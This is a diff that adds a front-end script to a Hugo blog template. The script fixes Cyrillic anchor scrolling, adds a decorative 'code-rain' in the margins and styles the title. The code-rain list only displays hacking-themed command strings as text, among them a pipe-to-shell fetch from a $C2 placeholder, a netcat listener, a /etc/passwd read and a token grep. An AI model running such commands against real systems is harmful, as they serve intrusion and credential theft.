@@ -9,3 +9,82 @@
     }
   })();
 </script>
+
+<script>
+  /* TOC / in-page anchors: Hugo percent-encodes the hrefs while heading ids stay
+     raw Cyrillic, and Turbo Drive looks up the non-decoded hash -> no scroll.
+     Decode and scroll manually. Also a decorative animated code-rain in the margins. */
+  (function () {
+    function anchorFix() {
+      document.querySelectorAll('a[href^="#"]').forEach(function (a) {
+        if (a.__af) return; a.__af = 1;
+        a.addEventListener('click', function (e) {
+          var raw = this.getAttribute('href').slice(1);
+          if (!raw || raw === 'top') return;
+          var id = decodeURIComponent(raw);
+          var el = document.getElementById(id) || document.getElementById(raw);
+          if (el) {
+            e.preventDefault();
+            el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            try { history.replaceState(null, '', '#' + raw); } catch (_) {}
+          }
+        });
+      });
+    }
+
+    function codeRain() {
+      if (window.matchMedia('(max-width:1300px)').matches) return;
+      if (document.querySelector('.code-rain')) return;
+      var lines = [
+        'nmap -sS -p- 10.0.0.0/24', 'ssh root@target', 'whoami && id',
+        'cat /etc/passwd', '0xDEADBEEF', 'grep -r "token" /srv',
+        'sqlmap -u "?id=1" --dbs', 'hydra -l admin -P list.txt ssh',
+        'for i in $(seq 1 254); do', '  ping -c1 10.0.0.$i', 'done',
+        'import socket, struct', 'buf = b"\\x90" * 40', 'payload += p32(eip)',
+        'nc -lvnp 4444', 'tcpdump -i eth0 -w cap.pcap', 'john --wordlist=w hash',
+        'SELECT * FROM users --', 'export LHOST=10.10.14.7', 'msfconsole -q',
+        'base64 -d blob | gunzip', 'openssl enc -aes-256-cbc', 'chmod +x ./run',
+        'curl -s $C2 | sh', 'dig +short target.tld', 'strings bin | grep key'
+      ];
+      function block(n) {
+        var s = '';
+        for (var i = 0; i < n; i++) s += lines[(Math.random() * lines.length) | 0] + '\n';
+        return s;
+      }
+      ['left', 'right'].forEach(function (side) {
+        var w = document.createElement('div');
+        w.className = 'code-rain ' + side;
+        w.setAttribute('aria-hidden', 'true');
+        var st = document.createElement('div');
+        st.className = 'stream';
+        var b = block(60);
+        st.textContent = b + b; /* duplicate for seamless -50% loop */
+        w.appendChild(st);
+        document.body.appendChild(w);
+      });
+    }
+
+    function titleAccent() {
+      var h = document.querySelector('h1.post-title');
+      if (!h || h.children.length || h.querySelector('.title-accent')) return;
+      var txt = h.textContent.replace(/\s+/g, ' ').trim();
+      var i = txt.lastIndexOf(' ');
+      if (i < 0) return;
+      /* h1 is a flex container (.entry-hint-parent, space-between); wrap the whole
+         title in ONE child so it stays a single flex item and flows inline. */
+      var wrap = document.createElement('span');
+      wrap.appendChild(document.createTextNode(txt.slice(0, i + 1)));
+      var s = document.createElement('span');
+      s.className = 'title-accent';
+      s.textContent = txt.slice(i + 1);
+      wrap.appendChild(s);
+      h.textContent = '';
+      h.appendChild(wrap);
+    }
+
+    function init() { anchorFix(); codeRain(); titleAccent(); }
+    document.addEventListener('DOMContentLoaded', init);
+    document.addEventListener('turbo:load', init);
+    if (document.readyState !== 'loading') init();
+  })();
+</script>
